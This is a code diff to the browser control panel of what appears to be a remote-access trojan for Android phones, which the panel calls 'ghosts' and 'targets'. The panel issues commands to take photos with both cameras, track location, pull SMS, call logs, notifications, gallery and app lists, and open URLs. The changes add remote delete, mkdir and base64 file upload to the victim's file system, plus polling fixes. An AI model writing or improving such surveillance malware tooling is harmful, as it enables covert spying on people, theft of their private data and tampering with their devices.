@@ -549,7 +549,7 @@
         let agentMessageHashes = new Set();
         let flashOn = false, screenRecordOn = false;
         let popupHideTimer = null;
-        let modalLoading = false;  // to avoid multiple animations
+        let lastDataHashes = {}; // To prevent flicker
 
         // helper: show modern popup (no refresh)
         function showPopup(type, message) {
@@ -576,7 +576,7 @@
         }
 
         // select device
-        function selectDevice(clientId) {
+        function selectDevice(clientId, skipModalClose = false) {
             if (selectedClientId === clientId) return;
             selectedClientId = clientId;
             flashOn = false; screenRecordOn = false;
@@ -585,7 +585,7 @@
             const el = document.getElementById(safeId);
             if (el) el.classList.add('active');
             updateMainDashboard();
-            closeModal();
+            if (!skipModalClose) closeModal();
         }
 
         // update device list
@@ -593,8 +593,10 @@
             const container = document.getElementById('device-list');
             if (!state.devices.length) {
                 container.innerHTML = '<div class="device-item" style="opacity:0.5">♢ no ghosts</div>';
-                if(selectedClientId) selectedClientId = null;
-                updateMainDashboard();
+                if(selectedClientId) {
+                    selectedClientId = null;
+                    updateMainDashboard();
+                }
                 return;
             }
             let html = '';
@@ -607,7 +609,7 @@
             });
             container.innerHTML = html;
             if (!selectedClientId || !state.devices.some(d => d.id === selectedClientId)) {
-                if (state.devices.length) selectDevice(state.devices[0].id);
+                if (state.devices.length) selectDevice(state.devices[0].id, true); // Don't close modal on auto-select
             } else {
                 // re-highlight
                 document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
@@ -664,20 +666,12 @@
         // global click handler for grid
         window.handleGridClick = (action) => {
             if (!selectedClientId) { showPopup('error', 'Select target first'); return; }
-            const specials = ['flash','screenrecord','takebackpic','takefrontpic','get_location','toast','openurl','sms','calls','filemanager','gallery','notifications','apps'];
             if (action === 'flash') { toggleFlash(); updateMainDashboard(); }
             else if (action === 'screenrecord') { toggleScreenRecord(); updateMainDashboard(); }
             else if (action === 'takebackpic') sendCommand('takebackpic');
             else if (action === 'takefrontpic') sendCommand('takefrontpic');
             else if (action === 'get_location') sendCommand('get_location');
-            else if (action === 'toast') openModal('toast');
-            else if (action === 'openurl') openModal('openurl');
-            else if (action === 'sms') openModal('sms');
-            else if (action === 'calls') openModal('calls');
-            else if (action === 'filemanager') openModal('filemanager');
-            else if (action === 'gallery') openModal('gallery');
-            else if (action === 'notifications') openModal('notifications');
-            else if (action === 'apps') openModal('apps');
+            else openModal(action);
         };
 
         function toggleFlash() { flashOn = !flashOn; sendCommand(flashOn ? 'flashon' : 'flashoff'); }
@@ -687,6 +681,7 @@
         function openModal(type) {
             if (!selectedClientId) return showPopup('error', 'no target');
             currentModal = type;
+            lastDataHashes[type] = ""; // Reset hash to force first render
             document.getElementById('main-modal').style.display = 'flex';
             document.getElementById('modal-title').innerText = type.toUpperCase();
             const body = document.getElementById('modal-body');
@@ -694,15 +689,6 @@
             body.innerHTML = `<div class="data-loader"><i class="fas fa-spinner fa-pulse" style="font-size:2rem;color:var(--accent-secondary)"></i><div class="mini-loader-bar"><div class="mini-loader-fill" style="width:90%"></div></div><span>injecting...</span></div>`;
             footer.innerHTML = '';
 
-            if (!clientDataCache[selectedClientId]) {
-                // fake loading then show no data
-                setTimeout(() => {
-                    if (currentModal === type) body.innerHTML = '<p style="color:var(--text-dim)">◈ no cached data, but you can request manually.</p>';
-                }, 900);
-            } else {
-                // render after tiny delay to mimic loading
-                setTimeout(() => renderModalContent(), 400);
-            }
             // request fresh data
             const cmdMap = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications' };
             if (cmdMap[type]) sendCommand(cmdMap[type]);
@@ -710,6 +696,7 @@
 
         window.closeModal = () => {
             if (currentModal === 'gallery') sendCommand('exit_gallery');
+            if (currentModal === 'filemanager') sendCommand('exit_shell');
             document.getElementById('main-modal').style.display = 'none';
             currentModal = null;
         };
@@ -719,6 +706,12 @@
             const body = document.getElementById('modal-body');
             const footer = document.getElementById('modal-footer');
             const data = clientDataCache[selectedClientId] || {};
+            
+            // Check if data changed to prevent flickering
+            const currentData = JSON.stringify(data[currentModal] || data[`${currentModal}_logs`] || {});
+            if (lastDataHashes[currentModal] === currentData) return;
+            lastDataHashes[currentModal] = currentData;
+
             footer.innerHTML = '';
 
             if (currentModal === 'gallery') {
@@ -744,14 +737,30 @@
             }
             else if (currentModal === 'filemanager') {
                 const fm = data.file_manager || { path: '/', files: [] };
-                let html = `<p>path: ${fm.path}</p><table>`;
-                html += `<tr><td colspan="2"><a href="#" onclick="sendCommand('cd ..')">📁 .. (up)</a></td></tr>`;
+                let html = `<div style="margin-bottom:10px; color:var(--accent-primary)">Path: ${fm.path}</div><table>`;
+                html += `<tr><td colspan="2"><a href="#" onclick="sendCommand('cd ..'); return false;" style="color:var(--accent-secondary); text-decoration:none;">📁 .. (up)</a></td></tr>`;
                 fm.files.forEach(f => {
-                    if (f.isDirectory) html += `<tr><td><a href="#" onclick="sendCommand('cd ${f.name}')">📁 ${f.name}</a></td><td></td></tr>`;
-                    else html += `<tr><td>📄 ${f.name}</td><td><button class="grid-item" onclick="sendCommand('get ${f.name}')">⬇️</button></td></tr>`;
+                    const icon = f.isDirectory ? '📁' : '📄';
+                    if (f.isDirectory) {
+                        html += `<tr><td><a href="#" onclick="sendCommand('cd ${f.name}'); return false;" style="color:var(--text); text-decoration:none;">${icon} ${f.name}</a></td>
+                                 <td><button onclick="handleFmAction('delete', '${f.name}')" style="background:none; border:1px solid red; color:red; padding:2px 8px; font-size:0.7rem;">DEL</button></td></tr>`;
+                    } else {
+                        html += `<tr><td>${icon} ${f.name}</td>
+                                 <td>
+                                    <button onclick="sendCommand('get ${f.name}')" style="background:none; border:1px solid var(--accent-primary); color:var(--accent-primary); padding:2px 8px; font-size:0.7rem;">GET</button>
+                                    <button onclick="handleFmAction('delete', '${f.name}')" style="background:none; border:1px solid red; color:red; padding:2px 8px; font-size:0.7rem;">DEL</button>
+                                 </td></tr>`;
+                    }
                 });
                 body.innerHTML = html + '</table>';
-                footer.innerHTML = `<input placeholder="new name" id="fm-input"><button onclick="handleFmAction('rename')">Rename</button>`;
+                footer.innerHTML = `
+                    <button onclick="document.getElementById('fm-upload').click()">Upload</button>
+                    <input type="file" id="fm-upload" style="display:none" onchange="handleFmAction('upload', this)">
+                    <input placeholder="folder name" id="fm-mkdir-input" style="width:100px">
+                    <button onclick="handleFmAction('mkdir')">Mkdir</button>
+                    <input placeholder="new name" id="fm-input" style="width:100px">
+                    <button onclick="handleFmAction('rename')">Rename</button>
+                `;
             }
             else if (currentModal === 'notifications') {
                 const notifs = data.notifications || [];
@@ -765,10 +774,24 @@
 
         window.sendToast = () => { const t = document.getElementById('toast-text')?.value; if(t) sendCommand(`toast on ${t}`); };
         window.sendOpenUrl = () => { const u = document.getElementById('url-text')?.value; if(u) sendCommand(`openurl ${u}`); };
-        window.handleFmAction = (act) => {
+        window.handleFmAction = (act, param) => {
             if (act === 'rename') {
                 const name = prompt('file to rename?');
                 if (name && document.getElementById('fm-input')?.value) sendCommand(`rename ${name} ${document.getElementById('fm-input').value}`);
+            } else if (act === 'delete') {
+                if(confirm('Delete ' + param + '?')) sendCommand('del ' + param);
+            } else if (act === 'mkdir') {
+                const val = document.getElementById('fm-mkdir-input')?.value;
+                if(val) { sendCommand('mkdir ' + val); document.getElementById('fm-mkdir-input').value = ''; }
+            } else if (act === 'upload') {
+                const file = param.files[0];
+                if(!file) return;
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const b64 = btoa(e.target.result);
+                    sendCommand('upload', { filename: btoa(file.name), data: b64 });
+                };
+                reader.readAsBinaryString(file);
             }
         };
 
@@ -778,19 +801,25 @@
                 const res = await fetch('/api/status');
                 state = await res.json();
                 updateDeviceList();
-                for (const dev of state.devices) {
-                    const dres = await fetch(`/api/client_data/${dev.id}`);
+
+                if (selectedClientId) {
+                    const dres = await fetch(`/api/client_data/${selectedClientId}`);
                     const cdata = await dres.json();
-                    clientDataCache[dev.id] = cdata;
-                    if (dev.id === selectedClientId && currentModal) renderModalContent();
+                    clientDataCache[selectedClientId] = cdata;
+                    
+                    if (currentModal) renderModalContent();
+
                     // popup notif
-                    if (dev.id === selectedClientId && cdata.agent_messages?.length) {
+                    if (cdata.agent_messages?.length) {
                         const msg = cdata.agent_messages[0];
-                        const h = dev.id+msg;
+                        const h = selectedClientId + msg;
                         if (!agentMessageHashes.has(h)) { showPopup('info', msg); agentMessageHashes.add(h); }
                     }
                 }
-            } catch (e) { document.getElementById('connection-status').innerHTML = 'ERR'; }
+            } catch (e) { 
+                console.error(e);
+                document.getElementById('connection-status').innerHTML = 'ERR'; 
+            }
             setTimeout(pollStatus, 2800);
         }
 
